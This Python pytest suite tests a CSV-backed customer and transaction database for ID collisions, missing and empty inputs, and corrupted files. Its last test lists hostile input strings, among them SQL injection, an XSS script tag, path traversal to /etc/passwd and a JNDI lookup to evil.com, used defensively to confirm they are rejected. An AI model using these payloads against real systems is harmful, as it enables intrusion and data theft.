"""
Adversarial Edge-Case, Missing-Data, and Collision Verification Suite for Milestone 2.
Challenger: Milestone 2 Challenger 2 (Empirical Challenger)

Coverage:
1. Partial ID collision prevention (e.g. USR-1049 must NOT match USR-10492; ORD-8821 must NOT match ORD-88219)
2. Non-existent queries (no fallback to Alex Morgan USR-10492 or ORD-88219)
3. Empty strings and null arguments across all 6 new functions
4. Corrupted CSV handling (NULL bytes, malformed lines, zero-byte files)
5. Missing CSV file boundaries
6. Missing column resilience
7. Injection & hostile input safety
"""

import csv
import os
from pathlib import Path
import pytest

import app.database as db


# =========================================================================
# 1. Partial ID Collision Prevention
# =========================================================================

def test_partial_customer_id_query_customer_account(isolated_database):
    """Querying customer_id='USR-1049' must NOT match 'USR-10492' (Alex Morgan)."""
    assert db.query_customer_account(customer_id="USR-1049") is None
    assert db.query_customer_account(customer_id="USR-104") is None
    assert db.query_customer_account(customer_id="USR-104922") is None
    assert db.query_customer_account(customer_id="USR-0891") is None
    assert db.query_customer_account(customer_id="USR-0723") is None


def test_partial_customer_id_query_transactions(isolated_database):
    """Querying transactions with customer_id='USR-1049' must return empty list."""
    assert db.query_transactions(customer_id="USR-1049") == []
    assert db.query_transactions(customer_id="USR-104") == []
    assert db.query_transactions(customer_id="USR-104922") == []
    assert db.query_transactions(customer_id="USR-0891") == []


def test_partial_transaction_id_query_transactions(isolated_database):
    """Querying transaction_id='TXN-901' must NOT match 'TXN-9011' or 'TXN-9012'."""
    assert db.query_transactions(transaction_id="TXN-901") == []
    assert db.query_transactions(transaction_id="TXN-90122") == []
    assert db.query_transactions(transaction_id="TXN-771") == []
    assert db.query_transactions(transaction_id="TXN-880") == []


def test_partial_order_id_collision_prevention(isolated_database):
    """Partial order ID 'ORD-8821' or '8821' must NOT match 'ORD-88219'."""
    assert db.query_transactions(order_id="ORD-8821") == []
    assert db.query_transactions(order_id="8821") == []
    assert db.query_transactions(order_id="ORD-882199") == []
    assert db.query_transactions(order_id="ORD-8109") == []

    assert db.query_customer_account(order_id="ORD-8821") is None
    assert db.query_customer_account(order_id="8821") is None
    assert db.query_customer_account(order_id="ORD-882199") is None
    assert db.query_customer_account(order_id="ORD-8109") is None


def test_partial_id_find_customer_and_transactions(isolated_database):
    """find_customer_account_by_query and find_transactions_for_query with partial customer IDs."""
    assert db.find_customer_account_by_query(customer_id="USR-1049") is None
    assert db.find_customer_account_by_query(query="USR-1049") is None
    assert db.find_customer_account_by_query(query="TXN-901") is None

    assert db.find_transactions_for_query(customer_id="USR-1049") == []
    assert db.find_transactions_for_query(query="USR-1049") == []
    assert db.find_transactions_for_query(query="TXN-901") == []


def test_order_prefix_in_find_customer_account_by_query(isolated_database):
    """
    Adversarial Challenge Finding:
    In find_customer_account_by_query, lines 723-728 use 'ref_num in ref_order'.
    While query_customer_account and query_transactions properly require exact order match,
    the legacy helper find_customer_account_by_query extracts 4-6 digits and does substring match.
    We document this empirical behavior:
    """
    # query_customer_account correctly does NOT match partial order prefixes:
    assert db.query_customer_account(order_id="ORD-8821") is None
    assert db.query_transactions(order_id="ORD-8821") == []

    # But find_customer_account_by_query's regex extracts '8821', which is a substring of 'ORD-88219'
    res_legacy = db.find_customer_account_by_query(query="ORD-8821")
    # This matches Alex Morgan due to substring matching in line 728
    assert res_legacy is not None
    assert res_legacy["customer_id"] == "USR-10492"



# =========================================================================
# 2. Non-Existent Queries (No Silent Fallback to Alex Morgan)
# =========================================================================

def test_nonexistent_customer_id_query_customer_account(isolated_database):
    """Querying unknown customer ID returns None, never Alex Morgan."""
    assert db.query_customer_account(customer_id="USR-99999") is None
    assert db.query_customer_account(customer_id="UNKNOWN-CUST") is None


def test_nonexistent_email_query_customer_account(isolated_database):
    """Querying unknown email returns None."""
    assert db.query_customer_account(email="ghost@nonexistent.org") is None
    assert db.query_customer_account(email="nobody@alexmorgan.fake") is None


def test_nonexistent_order_query_customer_account(isolated_database):
    """Querying unknown order returns None."""
    assert db.query_customer_account(order_id="ORD-00000") is None
    assert db.query_customer_account(order_id="999999") is None


def test_nonexistent_customer_transactions(isolated_database):
    """Querying transactions for unknown customer returns empty list."""
    assert db.query_transactions(customer_id="USR-99999") == []
    assert db.query_transactions(customer_id="NO_SUCH_USER") == []


def test_nonexistent_order_transactions(isolated_database):
    """Querying transactions for unknown order returns empty list."""
    assert db.query_transactions(order_id="ORD-00000") == []
    assert db.query_transactions(order_id="00000") == []


def test_nonexistent_status_and_cycle_transactions(isolated_database):
    """Querying with non-matching status or billing cycle returns empty list."""
    assert db.query_transactions(status="NonExistentStatus") == []
    assert db.query_transactions(billing_cycle="January 1970") == []
    assert db.query_transactions(customer_id="USR-10492", status="Cancelled") == []


def test_nonexistent_inspect_account_and_transactions(isolated_database):
    """inspect_account_and_transactions on unknown queries must return ok=False with no fallback."""
    res_id = db.inspect_account_and_transactions(customer_id="USR-99999")
    assert res_id["ok"] is False
    assert res_id["account"] is None
    assert res_id["transactions"] == []
    assert res_id["has_duplicate"] is False

    res_q = db.inspect_account_and_transactions(query="How do I change my workspace dark mode setting?")
    assert res_q["ok"] is False
    assert res_q["account"] is None
    assert res_q["transactions"] == []

    res_unmatched = db.inspect_account_and_transactions(query="unmatched random inquiry")
    assert res_unmatched["ok"] is False
    assert res_unmatched["account"] is None
    assert res_unmatched["transactions"] == []


def test_nonexistent_find_transactions_for_query(isolated_database):
    """find_transactions_for_query on unknown customer or query returns empty list."""
    assert db.find_transactions_for_query(customer_id="USR-99999") == []
    assert db.find_transactions_for_query(query="Why is the sky blue?") == []
    assert db.find_transactions_for_query(query="random customer complaint with no matching keywords") == []


# =========================================================================
# 3. Null, Empty Strings, and Whitespace Arguments Across All 6 Functions
# =========================================================================

def test_empty_null_query_customer_account(isolated_database):
    """query_customer_account handles null, empty, and whitespace arguments safely."""
    assert db.query_customer_account() is None
    assert db.query_customer_account(None, None, None) is None
    assert db.query_customer_account("", "", "") is None
    assert db.query_customer_account("   ", "   ", "   ") is None
    assert db.query_customer_account(customer_id="") is None
    assert db.query_customer_account(email="") is None
    assert db.query_customer_account(order_id="") is None


def test_empty_null_query_transactions(isolated_database):
    """query_transactions handles null, empty, and whitespace arguments safely."""
    # When all filter args are None, returns all transactions
    all_tx = db.query_transactions()
    assert len(all_tx) == 8

    # When an explicit empty string is passed as filter, matches empty field (none exist) -> returns []
    assert db.query_transactions(customer_id="") == []
    assert db.query_transactions(customer_id="   ") == []
    assert db.query_transactions(order_id="") == []
    assert db.query_transactions(status="") == []
    assert db.query_transactions(transaction_id="") == []
    assert db.query_transactions(billing_cycle="") == []


def test_empty_null_inspect_account_and_transactions(isolated_database):
    """inspect_account_and_transactions handles null and empty arguments safely."""
    res1 = db.inspect_account_and_transactions()
    assert res1["ok"] is False
    assert res1["account"] is None
    assert res1["transactions"] == []

    res2 = db.inspect_account_and_transactions(customer_id=None, query=None)
    assert res2["ok"] is False
    assert res2["account"] is None

    res3 = db.inspect_account_and_transactions(customer_id="", query="")
    assert res3["ok"] is False
    assert res3["account"] is None

    res4 = db.inspect_account_and_transactions(customer_id="   ", query="   ")
    assert res4["ok"] is False
    assert res4["account"] is None


def test_empty_null_update_transaction(isolated_database):
    """update_transaction handles null and empty arguments safely."""
    assert db.update_transaction("", {"status": "Refunded"}) is False
    assert db.update_transaction(None, {"status": "Refunded"}) is False
    assert db.update_transaction("TXN-9011", {}) is False
    assert db.update_transaction("TXN-9011", None) is False
    assert db.update_transaction("", {}) is False
    assert db.update_transaction("   ", {"status": "Refunded"}) is False


def test_empty_null_update_customer_account(isolated_database):
    """update_customer_account handles null and empty arguments safely."""
    assert db.update_customer_account("", {"account_balance": "$0.00"}) is False
    assert db.update_customer_account(None, {"account_balance": "$0.00"}) is False
    assert db.update_customer_account("USR-10492", {}) is False
    assert db.update_customer_account("USR-10492", None) is False
    assert db.update_customer_account("", {}) is False
    assert db.update_customer_account("   ", {"account_balance": "$0.00"}) is False


def test_empty_null_remediate_duplicate_charge(isolated_database):
    """remediate_duplicate_charge handles null, empty, and omitted optional parameters."""
    res_empty_txn = db.remediate_duplicate_charge(order_id="ORD-88219", duplicate_txn_id="")
    assert res_empty_txn["ok"] is False
    assert res_empty_txn["status"] == "Failed"

    res_none_txn = db.remediate_duplicate_charge(order_id="ORD-88219", duplicate_txn_id=None)
    assert res_none_txn["ok"] is False
    assert res_none_txn["status"] == "Failed"

    # Empty order_id resolves from transaction record
    res_inferred = db.remediate_duplicate_charge(order_id="", duplicate_txn_id="TXN-7712")
    assert res_inferred["ok"] is True
    assert res_inferred["order_id"] == "ORD-81094"

    # None refund_amount defaults to transaction amount
    res_def_amt = db.remediate_duplicate_charge(
        order_id="ORD-88219", duplicate_txn_id="TXN-9012", refund_amount=None
    )
    assert res_def_amt["ok"] is True
    assert res_def_amt["refund_amount"] == "49.00"

    # None processed_by defaults to Troy
    res_def_proc = db.remediate_duplicate_charge(
        order_id="ORD-88219", duplicate_txn_id="TXN-9012", processed_by=None
    )
    assert res_def_proc["ok"] is True
    assert "Troy" in res_def_proc["processed_by"]


# =========================================================================
# 4. Unknown Update Targets and Unknown Columns
# =========================================================================

def test_update_nonexistent_transaction(isolated_database):
    """update_transaction on non-existent transaction_id returns False."""
    assert db.update_transaction("TXN-NONEXISTENT", {"status": "Refunded"}) is False


def test_update_nonexistent_customer_account(isolated_database):
    """update_customer_account on non-existent customer_id returns False."""
    assert db.update_customer_account("USR-NONEXISTENT", {"account_balance": "$0.00"}) is False


def test_update_transaction_ignores_unrecognized_columns(isolated_database):
    """update_transaction ignores fields not in FIELDNAMES and does not corrupt schema."""
    tx_file = isolated_database["transactions_file"]
    res = db.update_transaction("TXN-9011", {"invalid_column": "malicious_payload", "status": "Settled"})
    assert res is True

    # Check headers remain strictly FIELDNAMES
    with open(tx_file, "r", encoding="utf-8") as f:
        reader = csv.reader(f)
        headers = next(reader)
    assert headers == db.FIELDNAMES
    assert "invalid_column" not in headers


def test_update_customer_account_ignores_unrecognized_columns(isolated_database):
    """update_customer_account ignores fields not in CUSTOMER_ACCOUNT_FIELDNAMES."""
    acc_file = isolated_database["accounts_file"]
    res = db.update_customer_account("USR-10492", {"fake_col": "123", "account_status": "Active - In Good Standing"})
    assert res is True

    with open(acc_file, "r", encoding="utf-8") as f:
        reader = csv.reader(f)
        headers = next(reader)
    assert headers == db.CUSTOMER_ACCOUNT_FIELDNAMES
    assert "fake_col" not in headers


# =========================================================================
# 5. Corrupted CSV Handling
# =========================================================================

def test_corrupted_csv_null_bytes_handling(isolated_database, monkeypatch):
    """CSV containing null bytes or binary corruption is caught gracefully without crash."""
    bad_file = isolated_database["dir"] / "corrupted_tx.csv"
    with open(bad_file, "wb") as f:
        f.write(b"transaction_id,customer_id\x00\xff\xfe\x00binary_junk")

    monkeypatch.setattr(db, "DATABASE_FILE", bad_file)

    # read_all_transactions should catch exception and return []
    txs = db.read_all_transactions()
    assert isinstance(txs, list)
    assert txs == []

    # query_transactions should return []
    assert db.query_transactions(customer_id="USR-10492") == []

    # inspect_account_and_transactions should not crash
    res = db.inspect_account_and_transactions(customer_id="USR-10492")
    assert isinstance(res, dict)
    assert res["transactions"] == []


def test_corrupted_csv_zero_byte_files(isolated_database, monkeypatch):
    """Completely empty (0 byte) CSV files are handled cleanly."""
    empty_tx = isolated_database["dir"] / "empty_tx.csv"
    empty_acc = isolated_database["dir"] / "empty_acc.csv"
    empty_tx.touch()
    empty_acc.touch()

    monkeypatch.setattr(db, "DATABASE_FILE", empty_tx)
    monkeypatch.setattr(db, "CUSTOMER_ACCOUNTS_FILE", empty_acc)

    assert db.read_all_transactions() == []
    assert db.read_all_customer_accounts() == []
    assert db.query_customer_account(customer_id="USR-10492") is None
    assert db.query_transactions(customer_id="USR-10492") == []
    assert db.update_transaction("TXN-9011", {"status": "Refunded"}) is False
    assert db.update_customer_account("USR-10492", {"account_balance": "$0.00"}) is False


def test_corrupted_csv_header_only(isolated_database, monkeypatch):
    """CSV files with header only (0 records) return empty lists / None."""
    h_tx = isolated_database["dir"] / "header_tx.csv"
    h_acc = isolated_database["dir"] / "header_acc.csv"
    with open(h_tx, "w", newline="", encoding="utf-8") as f:
        writer = csv.writer(f)
        writer.writerow(db.FIELDNAMES)
    with open(h_acc, "w", newline="", encoding="utf-8") as f:
        writer = csv.writer(f)
        writer.writerow(db.CUSTOMER_ACCOUNT_FIELDNAMES)

    monkeypatch.setattr(db, "DATABASE_FILE", h_tx)
    monkeypatch.setattr(db, "CUSTOMER_ACCOUNTS_FILE", h_acc)

    assert db.query_customer_account(customer_id="USR-10492") is None
    assert db.query_transactions(customer_id="USR-10492") == []
    assert db.inspect_account_and_transactions(customer_id="USR-10492")["ok"] is False
    assert db.remediate_duplicate_charge(order_id="ORD-88219", duplicate_txn_id="TXN-9012")["ok"] is False


def test_corrupted_csv_ragged_rows(isolated_database, monkeypatch):
    """CSV with ragged rows (more commas than headers) does not crash DictReader."""
    ragged_acc = isolated_database["dir"] / "ragged_acc.csv"
    with open(ragged_acc, "w", newline="", encoding="utf-8") as f:
        f.write("customer_id,customer_name\n")
        f.write("USR-10492,Alex Morgan,extra_field_1,extra_field_2,extra_field_3\n")

    monkeypatch.setattr(db, "CUSTOMER_ACCOUNTS_FILE", ragged_acc)
    acc = db.query_customer_account(customer_id="USR-10492")
    assert acc is not None
    assert acc["customer_id"] == "USR-10492"
    assert acc["customer_name"] == "Alex Morgan"


# =========================================================================
# 6. Missing CSV Files Boundary
# =========================================================================

def test_missing_customer_accounts_file_graceful(isolated_database, monkeypatch):
    """Missing customer_accounts.csv does not cause unhandled crash."""
    missing_acc = isolated_database["dir"] / "nonexistent_accounts.csv"
    if missing_acc.exists():
        missing_acc.unlink()

    monkeypatch.setattr(db, "CUSTOMER_ACCOUNTS_FILE", missing_acc)

    assert db.query_customer_account(customer_id="USR-10492") is None
    assert db.update_customer_account("USR-10492", {"account_balance": "$0.00"}) is False


def test_missing_transactions_file_ensure_or_empty(isolated_database, monkeypatch):
    """Querying when transactions.csv is missing."""
    missing_tx = isolated_database["dir"] / "missing_tx.csv"
    if missing_tx.exists():
        missing_tx.unlink()

    monkeypatch.setattr(db, "DATABASE_FILE", missing_tx)

    # ensure_database_file will seed it if missing when reading
    txs = db.read_all_transactions()
    assert isinstance(txs, list)


# =========================================================================
# 7. Hostile / Injection Query Safety
# =========================================================================

def test_sql_and_script_injection_in_queries(isolated_database):
    """SQL injection, XSS, and script tags in query parameters do not cause crash or match."""
    hostile_inputs = [
        "'; DROP TABLE transactions; --",
        "' OR '1'='1",
        "<script>alert('xss')</script>",
        "../../../../etc/passwd",
        "${jndi:ldap://evil.com/a}",
        "%00",
        "\n\r\t",
    ]

    for hostile in hostile_inputs:
        assert db.query_customer_account(customer_id=hostile) is None
        assert db.query_customer_account(order_id=hostile) is None
        assert db.query_transactions(customer_id=hostile) == []
        assert db.query_transactions(order_id=hostile) == []
        assert db.query_transactions(transaction_id=hostile) == []
        assert db.update_transaction(hostile, {"status": "Refunded"}) is False
        assert db.update_customer_account(hostile, {"account_balance": "$0.00"}) is False
        rem = db.remediate_duplicate_charge(order_id=hostile, duplicate_txn_id=hostile)
        assert rem["ok"] is False
